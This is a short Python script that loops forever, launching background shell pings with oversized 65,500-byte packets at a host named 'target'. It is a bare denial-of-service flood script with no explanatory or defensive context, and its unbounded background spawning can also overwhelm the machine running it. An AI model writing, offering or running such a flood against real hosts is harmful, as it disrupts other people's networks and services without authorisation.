import subprocess
while True:
    subprocess.run("ping -s 65500 target &", shell=True)
